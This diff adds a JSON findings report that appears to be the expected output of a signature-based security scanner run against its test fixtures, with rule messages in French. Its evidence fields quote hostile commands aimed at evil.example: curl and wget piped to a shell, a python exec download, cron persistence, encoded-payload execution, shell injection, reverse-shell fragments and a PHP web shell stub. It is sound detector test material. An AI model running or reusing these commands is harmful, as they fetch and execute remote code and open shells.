@@ -1,0 +1,250 @@
+{
+  "summary": {
+    "severity_counts": {
+      "low": 0,
+      "medium": 5,
+      "high": 15,
+      "critical": 8
+    },
+    "integrity_counts": {
+      "added": 0,
+      "removed": 0,
+      "modified": 0,
+      "mode_changed": 0
+    },
+    "overall_severity": "critical"
+  },
+  "integrity": {
+    "added": [],
+    "removed": [],
+    "modified": [],
+    "mode_changed": []
+  },
+  "findings": [
+    {
+      "rule_id": "SIG-0007",
+      "severity": "high",
+      "path": "tests/fixtures/sig/authorized_keys",
+      "line": 1,
+      "evidence": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeKeyMaterialForSentinelTest",
+      "message": "Clé SSH publique ajoutée dans authorized_keys"
+    },
+    {
+      "rule_id": "SIG-0007",
+      "severity": "high",
+      "path": "tests/fixtures/sig/authorized_keys",
+      "line": 2,
+      "evidence": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCfakeKeyMaterialForSentinel",
+      "message": "Clé SSH publique ajoutée dans authorized_keys"
+    },
+    {
+      "rule_id": "SIG-0001",
+      "severity": "critical",
+      "path": "tests/fixtures/sig/bad_utf8.php",
+      "line": 1,
+      "evidence": "eval(base64_decode($_POST",
+      "message": "Web shell PHP : eval, base64_decode ou commande shell sur une entrée HTTP"
+    },
+    {
+      "rule_id": "SIG-0003",
+      "severity": "high",
+      "path": "tests/fixtures/sig/crontab.txt",
+      "line": 1,
+      "evidence": "curl http://evil.example/a | sh",
+      "message": "Téléchargement puis exécution (curl|sh, wget|bash, python -c avec urllib et exec)"
+    },
+    {
+      "rule_id": "SIG-0003",
+      "severity": "high",
+      "path": "tests/fixtures/sig/crontab.txt",
+      "line": 2,
+      "evidence": "wget -q -O- http://evil.example/b | bash",
+      "message": "Téléchargement puis exécution (curl|sh, wget|bash, python -c avec urllib et exec)"
+    },
+    {
+      "rule_id": "SIG-0006",
+      "severity": "high",
+      "path": "tests/fixtures/sig/crontab.txt",
+      "line": 1,
+      "evidence": "@reboot",
+      "message": "Persistance cron (@reboot, ou cinq champs * ou */N, avec curl, wget ou nc)"
+    },
+    {
+      "rule_id": "SIG-0006",
+      "severity": "high",
+      "path": "tests/fixtures/sig/crontab.txt",
+      "line": 2,
+      "evidence": "*/10 * * * * wget",
+      "message": "Persistance cron (@reboot, ou cinq champs * ou */N, avec curl, wget ou nc)"
+    },
+    {
+      "rule_id": "SIG-0003",
+      "severity": "high",
+      "path": "tests/fixtures/sig/download.sh",
+      "line": 1,
+      "evidence": "curl -fsSL http://evil.example/x | sh",
+      "message": "Téléchargement puis exécution (curl|sh, wget|bash, python -c avec urllib et exec)"
+    },
+    {
+      "rule_id": "SIG-0003",
+      "severity": "high",
+      "path": "tests/fixtures/sig/download.sh",
+      "line": 2,
+      "evidence": "wget -qO- http://evil.example/x | bash",
+      "message": "Téléchargement puis exécution (curl|sh, wget|bash, python -c avec urllib et exec)"
+    },
+    {
+      "rule_id": "SIG-0003",
+      "severity": "high",
+      "path": "tests/fixtures/sig/download.sh",
+      "line": 3,
+      "evidence": "python -c 'import urllib; exec(urllib.request.urlopen(\"http://evil.example/p\").read())'",
+      "message": "Téléchargement puis exécution (curl|sh, wget|bash, python -c avec urllib et exec)"
+    },
+    {
+      "rule_id": "SIG-0004",
+      "severity": "high",
+      "path": "tests/fixtures/sig/encoded.txt",
+      "line": 1,
+      "evidence": "base64 -d | sh",
+      "message": "Exécution de charge encodée (base64 -d|sh, eval(atob), powershell -enc)"
+    },
+    {
+      "rule_id": "SIG-0004",
+      "severity": "high",
+      "path": "tests/fixtures/sig/encoded.txt",
+      "line": 2,
+      "evidence": "eval(atob(",
+      "message": "Exécution de charge encodée (base64 -d|sh, eval(atob), powershell -enc)"
+    },
+    {
+      "rule_id": "SIG-0004",
+      "severity": "high",
+      "path": "tests/fixtures/sig/encoded.txt",
+      "line": 3,
+      "evidence": "powershell -enc",
+      "message": "Exécution de charge encodée (base64 -d|sh, eval(atob), powershell -enc)"
+    },
+    {
+      "rule_id": "SIG-0010",
+      "severity": "medium",
+      "path": "tests/fixtures/sig/headers.txt",
+      "line": 2,
+      "evidence": "User-Agent: sqlmap/1.7",
+      "message": "User-Agent d'outil d'attaque ou de client scripté"
+    },
+    {
+      "rule_id": "SIG-0008",
+      "severity": "critical",
+      "path": "tests/fixtures/sig/id_rsa",
+      "line": 1,
+      "evidence": "-----BEGIN RSA PRIVATE KEY-----",
+      "message": "Clé privée en clair (BEGIN RSA PRIVATE KEY ou BEGIN OPENSSH PRIVATE KEY)"
+    },
+    {
+      "rule_id": "SIG-0009",
+      "severity": "medium",
+      "path": "tests/fixtures/sig/inject.sh",
+      "line": 1,
+      "evidence": "$(curl http://evil.example/x)",
+      "message": "Injection shell (substitution de commande, rm -rf chaîné ou curl chaîné)"
+    },
+    {
+      "rule_id": "SIG-0009",
+      "severity": "medium",
+      "path": "tests/fixtures/sig/inject.sh",
+      "line": 2,
+      "evidence": "`wget http://evil.example/y`",
+      "message": "Injection shell (substitution de commande, rm -rf chaîné ou curl chaîné)"
+    },
+    {
+      "rule_id": "SIG-0009",
+      "severity": "medium",
+      "path": "tests/fixtures/sig/inject.sh",
+      "line": 3,
+      "evidence": ";rm -rf",
+      "message": "Injection shell (substitution de commande, rm -rf chaîné ou curl chaîné)"
+    },
+    {
+      "rule_id": "SIG-0009",
+      "severity": "medium",
+      "path": "tests/fixtures/sig/inject.sh",
+      "line": 4,
+      "evidence": "&& curl",
+      "message": "Injection shell (substitution de commande, rm -rf chaîné ou curl chaîné)"
+    },
+    {
+      "rule_id": "SIG-0005",
+      "severity": "high",
+      "path": "tests/fixtures/sig/miner.conf",
+      "line": 1,
+      "evidence": "stratum+tcp",
+      "message": "Indicateur de minage (stratum+tcp, xmrig, minerd, --donate-level)"
+    },
+    {
+      "rule_id": "SIG-0005",
+      "severity": "high",
+      "path": "tests/fixtures/sig/miner.conf",
+      "line": 2,
+      "evidence": "xmrig",
+      "message": "Indicateur de minage (stratum+tcp, xmrig, minerd, --donate-level)"
+    },
+    {
+      "rule_id": "SIG-0005",
+      "severity": "high",
+      "path": "tests/fixtures/sig/miner.conf",
+      "line": 3,
+      "evidence": "minerd",
+      "message": "Indicateur de minage (stratum+tcp, xmrig, minerd, --donate-level)"
+    },
+    {
+      "rule_id": "SIG-0008",
+      "severity": "critical",
+      "path": "tests/fixtures/sig/openssh_key",
+      "line": 1,
+      "evidence": "-----BEGIN OPENSSH PRIVATE KEY-----",
+      "message": "Clé privée en clair (BEGIN RSA PRIVATE KEY ou BEGIN OPENSSH PRIVATE KEY)"
+    },
+    {
+      "rule_id": "SIG-0002",
+      "severity": "critical",
+      "path": "tests/fixtures/sig/reverse.sh",
+      "line": 1,
+      "evidence": "bash -i",
+      "message": "Reverse shell (bash interactif, /dev/tcp, nc -e, ncat ou socat exec)"
+    },
+    {
+      "rule_id": "SIG-0002",
+      "severity": "critical",
+      "path": "tests/fixtures/sig/reverse.sh",
+      "line": 2,
+      "evidence": "nc -e",
+      "message": "Reverse shell (bash interactif, /dev/tcp, nc -e, ncat ou socat exec)"
+    },
+    {
+      "rule_id": "SIG-0002",
+      "severity": "critical",
+      "path": "tests/fixtures/sig/reverse.sh",
+      "line": 3,
+      "evidence": "ncat",
+      "message": "Reverse shell (bash interactif, /dev/tcp, nc -e, ncat ou socat exec)"
+    },
+    {
+      "rule_id": "SIG-0002",
+      "severity": "critical",
+      "path": "tests/fixtures/sig/reverse.sh",
+      "line": 4,
+      "evidence": "socat tcp-listen:4444,reuseaddr exec:",
+      "message": "Reverse shell (bash interactif, /dev/tcp, nc -e, ncat ou socat exec)"
+    },
+    {
+      "rule_id": "SIG-0001",
+      "severity": "critical",
+      "path": "tests/fixtures/sig/webshell.php",
+      "line": 2,
+      "evidence": "eval(base64_decode($_POST",
+      "message": "Web shell PHP : eval, base64_decode ou commande shell sur une entrée HTTP"
+    }
+  ]
+}
+
